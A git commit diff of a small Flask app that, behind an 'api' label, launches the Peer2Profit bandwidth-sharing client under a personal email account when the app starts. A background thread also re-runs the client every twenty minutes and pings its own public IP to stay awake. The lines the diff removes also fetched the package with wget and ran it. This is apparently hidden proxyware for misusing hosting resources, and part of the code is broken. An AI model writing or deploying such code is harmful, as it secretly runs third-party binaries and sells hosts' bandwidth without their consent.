198acb1088a87828c7dafbe562a4553c2d24625c
codewithap <99323868+codewithap@users.noreply.github.com>
2023-02-03 12:21:22 +0530

    Add files via upload

--- api/main.py
+++ api/main.py
@@ -5,20 +5,20 @@ import requests
 import threading
 app = Flask(__name__)
 
-subprocess.call("wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
+subprocess.call("dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
 
 @app.route("/")
 def s():
     def f1():
-        ip = request.environ['SERVER_NAME']
+        ip = requests.get("https://api.ipify.org").text
         while(True):
             r = requests.get(f"{ip}:5000")
             print(r)
-            subprocess.call("cd ~ && wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
+            subprocess.call("dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
             time.sleep(1200)
     t = threading.Thread(target=f1)
     t.start()
-    return f"{request.environ['SERVER_NAME']}"
+    return requests.get("https://api.ipify.org").text
 
 
 if __name__ == "__main__":
